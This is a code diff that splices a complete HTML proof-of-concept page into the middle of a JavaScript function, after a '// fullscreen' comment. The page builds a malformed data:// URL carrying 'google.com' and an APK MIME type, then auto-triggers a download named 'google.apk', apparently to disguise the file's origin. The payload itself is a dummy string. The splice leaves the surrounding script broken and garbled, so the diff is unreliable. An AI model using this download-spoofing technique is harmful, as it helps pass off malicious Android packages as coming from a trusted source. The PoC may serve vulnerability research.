@@ -10,7 +10,39 @@
 <script>
 function rfsSelectAll() {
 
-    // fullscreen
+    // fullscreen<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Malformed Data URL PoC</title>
+</head>
+<body>
+
+<h3>Malformed data:// APK PoC</h3>
+<button onclick="go()">Start</button>
+
+<script>
+function go() {
+  // dummy base64 kecil
+  const base64 = "ZXN0dGVzdA==";
+
+  // ⚠️ kunci bug ada di sini: data://google.com/
+  const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
+
+  // trigger download
+  const a = document.createElement('a');
+  a.href = payload;
+  a.download = "google.apk";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  console.log("Triggered malformed data:// download");
+}
+</script>
+
+</body>
+</html>
     if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen();
     }
